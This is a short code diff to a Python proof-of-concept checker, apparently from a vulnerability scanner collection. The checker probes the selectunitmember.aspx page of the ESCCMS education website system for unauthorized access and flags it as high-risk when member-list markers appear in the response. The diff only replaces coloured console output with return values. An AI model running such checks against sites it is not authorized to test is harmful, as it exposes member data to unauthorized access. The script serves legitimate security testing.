@@ -8,8 +8,8 @@ description: 文件selectunitmember.aspx未授权访问。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class esccms_selectunitmember_unauth_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class esccms_selectunitmember_unauth_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"doPostBack" in req.text and r"gvUnitMember" in req.text:
-                cprint("[+]存在易创思教育建站系统未授权漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在易创思教育建站系统未授权漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = esccms_selectunitmember_unauth_BaseVerify(sys.argv[1])
     testVuln.run()
